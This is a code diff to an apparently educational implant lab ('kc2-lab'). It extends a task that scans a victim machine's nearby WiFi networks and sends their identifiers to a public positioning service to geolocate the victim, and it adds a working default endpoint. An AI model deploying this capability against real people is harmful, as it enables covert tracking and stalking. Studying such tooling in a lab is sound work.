@@ -22,6 +22,11 @@ export const FIND_MAX_DEPTH = 6;
 export const GEO_MAX_APS = 20; // keep result tags bounded (~130B/tag)
 export const GEO_MAX_SSID_LEN = 32;
 export const GEO_HTTP_TIMEOUT_MS = 12_000;
+// beaconDB (the key-free MLS successor) requires clients to identify
+// themselves; a generic curl UA may be refused.
+export const GEO_USER_AGENT = 'kc2-lab/1.0 (educational wifi-positioning demo)';
+// Working WPS endpoint as of 2026: no key, MLS/Ichnaea-compatible.
+export const GEO_DEFAULT_SERVICE_URL = 'https://api.beacondb.net/v1/geolocate';
 
 const WINDOWS_PS_SCRIPT = `
 $total=[double](Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory;
@@ -324,8 +329,11 @@ export function scanWifiNetworks(platform, exec) {
  * temp-file body — nothing is interpolated into a shell.
  */
 export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
+  // considerIp lets services with sparse WiFi coverage (beaconDB outside
+  // mapped areas) fall back to a coarse IP estimate — the response marks it
+  // with `fallback`, which is itself a nice classroom contrast.
   const body = {
-    considerIp: false,
+    considerIp: true,
     wifiAccessPoints: aps.map((ap) => ({
       macAddress: ap.bssid,
       ...(ap.rssi !== null ? { signalStrength: ap.rssi } : {}),
@@ -341,7 +349,9 @@ export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
     fs.writeFileSync(tmp, JSON.stringify(body), { mode: 0o600 });
     const out = exec(
       'curl',
-      ['-sS', '-X', 'POST', '-H', 'Content-Type: application/json',
+      ['-sS', '-X', 'POST',
+        '-H', 'Content-Type: application/json',
+        '-H', `User-Agent: ${GEO_USER_AGENT}`,
         '--data-binary', `@${tmp}`, '--max-time', String(Math.ceil(GEO_HTTP_TIMEOUT_MS / 1000)), url],
       { encoding: 'utf8', timeout: GEO_HTTP_TIMEOUT_MS + 5000, windowsHide: true },
     );
@@ -365,6 +375,7 @@ export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
       lat,
       lng,
       accuracyM: Number.isFinite(accuracy) && accuracy > 0 ? Math.round(accuracy) : null,
+      fallback: typeof parsed?.fallback === 'string' ? parsed.fallback : null,
     };
   } finally {
     fs.rmSync(tmp, { force: true });
@@ -763,10 +774,13 @@ const TASKS = {
       lines.push(
         `location: lat=${fix.lat} lng=${fix.lng} accuracyM=${fix.accuracyM ?? 'unknown'}`,
       );
+      if (fix.fallback) {
+        lines.push(`fallback: ${fix.fallback} (coarse estimate — the WiFi BSSIDs were not in the database)`);
+      }
       lines.push(`service: ${new URL(serviceUrl).host}`);
     } else {
       lines.push('geolocate: wifi-scan (reconnaissance stage — no WPS lookup configured)');
-      lines.push('set geolocateServiceUrl on the victim to resolve coordinates via a WPS database');
+      lines.push(`set geolocateServiceUrl on the victim (e.g. ${GEO_DEFAULT_SERVICE_URL}) to resolve coordinates`);
     }
     lines.push(`access points (${used.length}${aps.length > used.length ? ` of ${aps.length}` : ''}):`);
     for (const ap of used) {
